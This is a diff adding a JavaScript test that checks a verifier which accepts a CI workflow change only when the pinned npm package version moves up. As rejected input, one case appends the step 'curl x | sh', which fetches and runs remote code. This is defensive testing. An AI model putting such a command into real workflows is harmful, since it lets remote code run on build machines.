@@ -435,6 +435,29 @@ describe("an unsigned seal at the critical level", () => {
     expect(liftSealedSupervisorViolations({ projectDir: repo, violations: [{ rule_id: "defaults.governance.write", file: policy }] }).violations).toHaveLength(1);
   });
 
+  // ADR 0060, step 2c: a release re-seal moves the kj the workflows pin, and nothing else.
+  it("backs a workflow whose only change from the base is the kj it pins, moved up", () => {
+    const wfFile = ".github/workflows/kj-verdicts.yml";
+    const wf = (v) => `on: pull_request\njobs:\n  v:\n    steps:\n      - run: npm install karajan-code@${v}\n`;
+    const git = (...args) => execFileSync("git", ["-C", repo, "-c", "user.name=t", "-c", "user.email=t@t", ...args], { encoding: "utf8" });
+    setSignedLevel(repo, "critical");
+    mkdirSync(join(repo, ".github", "workflows"), { recursive: true });
+    writeFileSync(join(repo, wfFile), wf("5.26.1"));
+    git("init", "-q");
+    git("add", "-A");
+    git("commit", "-qm", "base");
+    const judge = (text) => {
+      writeFileSync(join(repo, wfFile), text);
+      writeFileSync(join(repo, PROVENANCE_FILE), JSON.stringify({ kj_version: "9.9.9", generation, files: [{ file: wfFile, sha256: sha(text) }] }));
+      return verifiedSupervisorFiles({ projectDir: repo, base: "HEAD" }).files.has(wfFile);
+    };
+    expect(judge(wf("5.27.0"))).toBe(true);
+    expect(judge(`${wf("5.27.0")}      - run: curl x | sh\n`)).toBe(false);
+    expect(judge(wf("5.20.0"))).toBe(false);
+    writeFileSync(join(repo, wfFile), wf("5.27.0"));
+    expect(verifiedSupervisorFiles({ projectDir: repo }).files.has(wfFile)).toBe(false); // no base, no comparison
+  });
+
   it("never backs a deletion: it recomputes nothing", () => {
     setSignedLevel(repo, "critical");
     writeFileSync(join(repo, PROVENANCE_FILE), JSON.stringify({ kj_version: "9.9.9", generation, files: [{ file: ".karajan/hooks/pre-commit", deleted: true }] }));
